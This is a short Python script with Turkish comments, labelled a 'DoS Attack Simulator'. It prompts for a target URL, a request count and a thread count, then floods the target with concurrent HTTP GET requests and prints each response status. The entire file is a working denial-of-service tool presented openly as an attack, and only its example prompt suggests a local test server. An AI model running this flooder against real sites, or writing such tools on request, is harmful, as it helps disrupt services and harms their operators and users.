import requests
import threading

def attack(url):
    try:
        response = requests.get(url)
        print(f"✅ Status: {response.status_code}")
    except Exception as e:
        print(f"❌ Error: {e}")

def main():
    print("💥 DoS Attack Simulator 💥\n")

    # Kullanıcıdan URL, istek sayısı, thread sayısı al
    target_url = input("🎯 Enter target URL (e.g. http://127.0.0.1:5000): ").strip()
    number_of_requests = int(input("📨 Enter number of requests: "))
    thread_count = int(input("🔁 Enter thread count: "))

    print(f"\n🚀 Starting attack on {target_url} with {number_of_requests} requests and {thread_count} threads...\n")

    threads = []

    # Thread'leri oluştur
    for _ in range(number_of_requests):
        t = threading.Thread(target=attack, args=(target_url,))
        threads.append(t)
        t.start()

        # Eğer thread limiti aşıldıysa biraz beklet
        if len(threads) >= thread_count:
            for thread in threads:
                thread.join()
            threads = []

    # Kalan thread'leri beklet
    for thread in threads:
        thread.join()

    print("\n✅ Attack finished.")

if __name__ == "__main__":
    main()